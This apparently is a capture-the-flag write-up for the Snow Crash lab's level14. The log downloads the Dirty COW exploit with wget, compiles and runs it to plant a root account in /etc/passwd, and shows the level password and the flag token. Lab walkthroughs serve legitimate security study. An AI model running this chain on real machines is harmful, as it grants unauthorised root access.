┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level14
level14@192.168.1.64's password: 2A31L79asukciNyi8uppkEuSx
# There is no file or binary to exploit in home directory.
# Search for what can be exploit.
level14@SnowCrash:~$ uname -a
Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
# Linux kernel < 4.8.3 (created before 2018) are vulnerable to Dirty COW.
# Dirty COW allows privilege escalation by expoiting race condition on the copy-on-write mechanism.
level14@SnowCrash:~$ cd /tmp/
level14@SnowCrash:/tmp$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
level14@SnowCrash:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
level14@SnowCrash:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: <Enter>
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
# Login as root.
level14@SnowCrash:/tmp$ su firefart
Password: <Enter>
# Login as flag14 and get the flag.
firefart@SnowCrash:/tmp# su flag14
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
flag14@SnowCrash:~$ getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
